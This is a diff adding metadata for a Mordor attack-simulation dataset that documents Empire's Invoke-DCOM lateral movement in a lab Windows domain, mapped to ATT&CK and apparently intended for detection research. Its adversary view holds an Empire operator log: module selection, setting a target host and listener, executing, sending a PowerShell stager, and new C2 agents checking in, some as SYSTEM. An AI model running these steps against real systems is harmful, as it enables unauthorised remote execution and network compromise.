@@ -1,0 +1,91 @@
+title: Empire Invoke DCOM
+id: SD-190518211052
+author: Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/05/18
+platform: Windows
+mordor_environment: shire
+simulation_framework:
+  type: C2
+  name: Empire
+  script: https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
+permissions_required:
+  - User
+description: This dataset represents adversaries executing commands on remote hosts via MMC20.Application COM object over DCOM.
+dataset:
+  type: small
+  file: https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_dcom.tar.gz
+attack_mappings:
+  - technique: T1175
+    tactics:
+      - TA0002
+      - TA0008
+analytics_validation:
+adversary_view: |-
+  (Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_dcom
+  (Empire: powershell/lateral_movement/invoke_dcom) > info
+
+                Name: Invoke-DCOM
+              Module: powershell/lateral_movement/invoke_dcom
+          NeedsAdmin: False
+          OpsecSafe: True
+            Language: powershell
+  MinLanguageVersion: 2
+          Background: False
+    OutputExtension: None
+
+  Authors:
+    @rvrsh3ll
+
+  Description:
+    Invoke commands on remote hosts via MMC20.Application COM object over DCOM.
+
+  Options:
+
+    Name         Required    Value                     Description
+    ----         --------    -------                   -----------
+    Listener     True                                  Listener to use.                        
+    CredID       False                                 CredID from the store to use.           
+    ComputerName True                                  Host[s] to execute the stager on, comma 
+                                                      separated.                              
+    Proxy        False       default                   Proxy to use for request (default, none,
+                                                      or other).                              
+    ProxyCreds   False       default                   Proxy credentials                       
+                                                      ([domain\]username:password) to use for 
+                                                      request (default, none, or other).      
+    UserAgent    False       default                   User-agent string to use for the staging
+                                                      request (default, none, or other).      
+    Method       True        ShellWindows              COM method to use. MMC20.Application,She
+                                                      llWindows,ShellBrowserWindow,ExcelDDE   
+    Agent        True        V6W3TH8Y                  Agent to run module on.                 
+
+  (Empire: powershell/lateral_movement/invoke_dcom) > set Listener https
+  (Empire: powershell/lateral_movement/invoke_dcom) > set ComputerName IT001.shire.com
+  (Empire: powershell/lateral_movement/invoke_dcom) > execute
+  [*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
+  [*] Agent V6W3TH8Y tasked with task ID 3
+  [*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_dcom
+  (Empire: powershell/lateral_movement/invoke_dcom) > Completed
+
+
+  [*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
+  [*] New agent YR1FKZ6A checked in
+  [+] Initial agent YR1FKZ6A from 10.0.10.103 now active (Slack)
+  [*] Sending agent (stage 2) to YR1FKZ6A at 10.0.10.103
+
+  (Empire: powershell/lateral_movement/invoke_dcom) > agents 
+
+  [*] Active agents:
+
+  Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+  ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+  H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:11:59  https           
+  TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:11:59  https           
+  EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:11:58  https           
+
+  V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:11:58  https           
+  XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:11:58  https           
+  EXBNZYTS ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         6728   5/0.0    2019-05-18 21:12:02  https           
+
+  YR1FKZ6A ps 172.18.39.105   IT001             SHIRE\pgustavo          powershell         5228   5/0.0    2019-05-18 21:12:01  https           
+
+  (Empire: agents) >
